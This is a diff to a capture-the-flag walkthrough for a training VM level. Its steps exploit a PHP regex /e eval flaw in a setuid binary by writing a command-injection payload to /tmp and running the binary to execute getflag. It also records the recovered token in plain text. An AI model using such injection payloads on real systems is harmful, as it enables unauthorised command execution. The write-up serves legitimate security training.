@@ -119,15 +119,15 @@
 	that will be invoked even in the double quotes context.
 
 13. __Action__ (Guest): create a file named `exploit_php`
-	containing the string ``[x ${ $( getflag >/tmp/getflag_as_flag06 ) }]``
+	containing the string ``[x ${`getflag >/tmp/getflag_as_flag06`}]``
 	in the `/tmp` directory
 	```sh
-	echo '[x ${ $( getflag >/tmp/getflag_as_flag06 ) }]' >/tmp/exploit_php
+	echo '[x ${`getflag >/tmp/getflag_as_flag06`}]' >/tmp/exploit_php
 	```
 
 14. __Action__ (Guest): execute the `level06` file with the `/tmp/exploit_php` file as argument
 	```sh
-	./level06 /tmp/exploit_php
+	./level06 /tmp/exploit_php >/dev/null 2>&1
 	```
 
 15. __Action__ (Guest): check if the `getflag_as_flag06` file has been correctly created
@@ -154,18 +154,12 @@
 	by printing the following message on stdout:  
 	`Great! The token is correct!`
 
-19. __Action__ (Guest): extract the token from the `getflag_as_flag06` file
+19. __Action__ (Host): Save the token in the `flag` file
 	```sh
-	egrep -o '[^ ]+$' /tmp/getflag_as_flag06 >/tmp/token
+	echo wiok45aaoguiboiki2tuin6ub >level06/flag
 	```
 
-20. __Action__ (Host): copy the `token` file from the virtual machine
+20. __Action__ (Guest): remove the `test` and `getflag_as_flag06` files
 	```sh
-	sshpass -f level05/flag 2>/dev/null \
-		scp -P 4242 level06@192.168.122.214:/tmp/token level06/flag
-	```
-
-21. __Action__ (Guest): remove the `test`, `getflag_as_flag06`, and `token` files
-	```sh
-	rm /tmp/{'test','getflag_as_flag06','token'}
+	rm /tmp/{'test','getflag_as_flag06'}
 	```
